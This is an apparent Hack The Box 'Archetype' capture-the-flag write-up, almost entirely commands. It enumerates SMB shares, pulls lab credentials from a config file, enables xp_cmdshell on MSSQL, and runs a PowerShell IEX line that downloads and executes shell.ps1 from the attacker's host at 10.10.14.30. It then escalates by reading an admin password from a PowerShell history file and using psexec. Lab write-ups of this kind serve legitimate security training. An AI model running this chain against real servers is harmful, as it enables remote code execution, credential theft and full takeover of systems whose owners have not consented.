# Hack The Box : Starting Point : Archetype
```
export ip = 10.10.10.27
```
## Scan
```
135 msrpc
139 netbios-ssn
445 microsft-ds
1433 ms-sql-s

```


## Enumerate
```
1. smbclient -L \\\\export_ip\\
		ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

2. smbclient -N \\\\export_ip\\backups
3. get prod.dtsConfig
-- Admin : ARCHETYPE\sql_svc
-- Password : M3g4c0rp123
```

## Maintain Access
```
1. mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -windows-auth

2. xp_cmdshell configure command
- EXEC sp_configure 'Show Advanced Options', 1;
- reconfigure;
- sp_configure;
- EXEC sp_configure 'xp_cmdshell',1
- reconfigure;
- xp_cmdshell "whoami"

Reference File : shell.ps1
```

## MSSQL xp_cmdshell
```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.30:8000/shell.ps1\");"
```

## Privilige Escalte
```
1. type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
--> net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!

2. psexec administrator@10.10.10.27
```

## where is flag?
```
1. cd c:/

2. dir user.txt /s /p
: C:\Users\sql_svc\Desktop

3. dir root.txt /s/ p
: C:\Users\Administrator\Desktop
```